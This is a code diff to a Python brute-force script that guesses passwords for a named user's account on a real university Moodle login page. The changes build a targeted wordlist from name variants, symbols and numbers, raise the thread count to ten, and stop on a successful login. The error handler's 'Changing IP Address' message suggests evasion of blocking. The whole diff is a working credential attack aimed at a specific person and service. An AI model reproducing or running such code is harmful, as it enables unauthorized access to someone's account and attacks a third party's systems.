@@ -11,7 +11,13 @@ import os
 url="https://moodle.niituniversity.in/moodle/login/index.php"
 user="chowdavarapu.sriker"
 combinations=8*8*8*8*8*8*8*8
-res = itertools.permutations('srikar1.',8)
+#res = itertools.permutations('srikar1.',8)
+arr1=["srikar","lucifer","sriker"]
+arr2=[".","@","#"]
+arr3=[]
+for z in range(100):
+    arr3.append(str(z))
+res=itertools.product(arr1,arr2,arr3)
 count=0
 
 #File Object
@@ -44,17 +50,16 @@ def passwordCracker(combination):
             if session1!=session2:
                 with print_lock:
                     print("PASSWORD FOUND - " + str(pas))
-                    break
+                os._exit(1)
             else:
                 with print_lock:
                     print(str(pas)  + "  not Match")
     except Exception:
-        print("\n----" + str(Exception) + "-------\n")
         print("\nChanging IP Address\n")
         time.sleep(5)
 
 #Creating Threads
-for thread in range(4):
+for thread in range(10):
     th = threading.Thread(target=threader)
     th.daemon = True
     th.start()
